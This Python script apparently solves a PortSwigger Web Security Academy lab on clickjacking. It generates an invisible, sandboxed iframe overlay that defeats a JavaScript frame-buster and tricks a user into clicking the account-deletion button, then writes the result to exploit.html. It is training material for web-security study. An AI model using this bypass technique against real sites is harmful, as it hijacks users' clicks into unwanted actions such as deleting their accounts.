"""
Lab 3: Clickjacking with a frame buster script
https://portswigger.net/web-security/clickjacking/lab-frame-buster
Difficulty: Apprentice

📝 The flaw: same delete-account target as Lab 1, but the page carries a JS
frame-buster (something like `if (top !== self) top.location = self.location`).
Fix: give the iframe a `sandbox` attribute that allows scripts/forms to run,
but deliberately OMITS allow-top-navigation — the busting script executes
but throws when it tries to navigate the parent frame, so it effectively
no-ops while the page still renders and is still clickable.
"""

from utils import get_session, log, note, check_framing_defenses

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
VULNERABLE_PAGE = f"{TARGET}/my-account"


def build_sandboxed_overlay_poc(target_url, button_top="550px", button_left="60px"):
    note("sandbox is present but allow-top-navigation is NOT — that's the")
    note("whole trick. allow-forms + allow-scripts keep the page usable.")
    return f"""<style>
  iframe {{
    position: relative;
    width: 700px;
    height: 500px;
    opacity: 0.0001;
    z-index: 2;
  }}
  div {{
    position: absolute;
    top: {button_top};
    left: {button_left};
    z-index: 1;
  }}
</style>
<div>Click me</div>
<iframe sandbox="allow-forms allow-scripts allow-same-origin" src="{target_url}"></iframe>"""


def run():
    s = get_session()
    defenses = check_framing_defenses(s, VULNERABLE_PAGE)
    if defenses["js_buster"]:
        note("Confirmed: JS frame-buster detected in page source, as expected.")

    html = build_sandboxed_overlay_poc(VULNERABLE_PAGE)

    out_path = "exploit.html"
    with open(out_path, "w") as f:
        f.write(html)
    log(f"Wrote PoC to {out_path}")

    note("allow-same-origin is needed too if the busting script reads")
    note("document.domain/cookies — drop it only if the lab doesn't require it.")


if __name__ == "__main__":
    run()
